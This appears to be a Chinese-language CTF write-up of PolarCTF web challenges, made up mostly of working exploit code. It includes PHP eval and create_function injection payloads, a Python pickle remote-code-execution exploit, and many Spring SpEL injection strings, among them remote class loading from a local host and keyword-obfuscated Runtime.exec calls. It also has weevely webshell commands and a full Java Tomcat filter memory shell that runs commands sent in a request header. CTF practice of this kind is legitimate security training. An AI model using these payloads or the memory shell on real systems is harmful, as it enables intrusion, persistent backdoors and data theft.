# web
### swp
递归绕过正则限制
```python
import requests
data = {"xdmtql": "sys nb" + "aaaaa" * 1000000}
res = requests.post('http://d9d00980-d2fc-412e-b6cc-b6db2562eafb.www.polarctf.com:8090/index.php', data=data, allow_redirects=False)
print(res.content)

```

### 简单rce
$IFS空格绕过+sort读取文件

### 上传


### 非常好绕的命令执行

hex2bin转换
`http://1ae67e55-509c-49e4-9bf7-a04be9788ca5.www.polarctf.com:8090/?args1=hex2bin&args2='73797374656d'&args3='ls'`

### php是世界上最好的语言
变量覆盖
```php
<?php
//flag in $flag
highlight_file(__FILE__);
include("flag.php");
$c=$_POST['sys'];
$key1 = 0;
$key2 = 0;
if(isset($_GET['flag1']) || isset($_GET['flag2']) || isset($_POST['flag1']) || isset($_POST['flag2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($flag1 == '8gen1' && $flag2 == '8gen1') {
    if(isset($_POST['504_SYS.COM'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\?/", $c)){
         eval("$c");  

    }
}
}
?>
```

```http
http://www.xxx.com?_POST[flag1]=8gen1&_POST[flag2]=8gen1
post:sys=echo($flag);&504[SYS.COM=a
```

### \$\$
`$GLOBALS`全局变量
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211154038.png)


### 某函数的复仇
create_function注入

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211163836.png)

```php
$shaw('',$root);


root=}system('more /flag');/*
shaw=create_function
```


### veryphp
call_user_func
调用类的方法
`myans=qwq::oao`

### unpickle
#pickle 

```python
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        return (eval,("__import__('os').popen('cat /flag').read()",))


e = exp()
s = pickle.dumps(e)#将获取的对象序列化
user = base64.b64encode(s).decode()##将序列化的对象使用base64加密
print(user)#输出加密后的序列化对象
```

### upload tutu
使用`fastcoll`生成俩个hash值相同的文件,在`D:\CTF_Tools\fastcoll_v1.0.0.5.exe\fastcoll_v1.0.0.5.exe`

`fastcoll_v1.0.0.5.exe -p test.php -o test1.php test2.php`


### ezjava
Spel表达式注入
```java
//简单rce
new java.lang.ProcessBuilder("calc").start()
T(java.lang.Runtime).getRuntime().exec('calc')
new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);")

//远程类加载
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8888/')}).loadClass("evil").getConstructors()[0].newInstance()

new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8888/')}).loadClass("evil").newInstance()



//回显
new java.util.Scanner(new java.lang.ProcessBuilder("ls", "app").start().getInputStream(), "GBK").useDelimiter("asdasdasdasd").next()

new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()

//需要注册一个response上下文
#response.addHeader('x-cmd',new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine())


//内存🐎
T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()

//关键字绕过
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),newString[]{"cmd","/C","calc"})

''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("ex"+"ec",T(String[])).invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("getRu"+"ntime").invoke(null),'calc')
```


### 这又是一个上传
可以直接上传一个php,但是权限很低,什么也做不了

使用`weevely`,在`D:\CTF_Tools\weevely3\`
```bash
#生成shell
python3 weevely.py generate cmd shell.php
#连接shell
python3 weevely.py http://xxx.php cmd
```

### 你的马呢？
apache解析漏洞
> AddHandler导致的Apache解析漏洞
如果服务器给.php后缀添加了处理器：
AddHandler application/x-httpd-php.php
那么，在有多个后缀的情况下，只要包含.php后缀的文件就会被识别出php文件进行解析，不需要是最后一个后缀。如shell.php.jpg中包含.php，所以解析为php文件
利用：
1、1.php.jpg
2、1.php.txt
影响范围：2.4.0-2.4.29版本

---

### CB链
java反序列化CommonBean链,不出网

cb链使用类加载器加载恶意类

```java
package ysoserial.cb;

import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.stream.Collectors;

public class Exp implements javax.servlet.Filter{
    private javax.servlet.http.HttpServletRequest request = null;
    private org.apache.catalina.connector.Response response = null;
    private javax.servlet.http.HttpSession session =null;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    public void destroy() {}
    @Override
    public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException {
        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;
        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;
        javax.servlet.http.HttpSession session = request.getSession();
        String cmd = request.getHeader("Polar-CMD");
        System.out.println(cmd);
        if (cmd != null) {
            //System.out.println("1");
            response.setHeader("Polar-START", "OK");
            // 使用 ProcessBuilder 执行命令
            Process process = new ProcessBuilder(cmd.split("\\s+"))
                .redirectErrorStream(true)
                .start();
            //System.out.println("2");
            // 获取命令执行的输入流
            InputStream inputStream = process.getInputStream();

            // 使用 Java 8 Stream 将输入流转换为字符串
            String result = new BufferedReader(new InputStreamReader(inputStream))
                .lines()
                .collect(Collectors.joining(System.lineSeparator()));
            System.out.println("3");
            response.setHeader("Polar-RESULT",result);

        } else {
            filterChain.doFilter(request, response);
        }
    }

    public boolean equals(Object obj) {
        Object[] context=(Object[]) obj;
        this.session = (javax.servlet.http.HttpSession ) context[2];
        this.response = (org.apache.catalina.connector.Response) context[1];
        this.request = (javax.servlet.http.HttpServletRequest) context[0];

        try {
            dynamicAddFilter(new Exp(),"Shell","/*",request);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        return true;
    }

    public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {
        javax.servlet.ServletContext servletContext=request.getServletContext();
        if (servletContext.getFilterRegistration(name) == null) {
            java.lang.reflect.Field contextField = null;
            org.apache.catalina.core.ApplicationContext applicationContext =null;
            org.apache.catalina.core.StandardContext standardContext=null;
            java.lang.reflect.Field stateField=null;
            javax.servlet.FilterRegistration.Dynamic filterRegistration =null;

            try {
                contextField=servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
                contextField=applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(name, filter);
                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url});
                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, null);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }catch (Exception e){
            }finally {
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }
        }
    }
}

```


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-12-09   23:22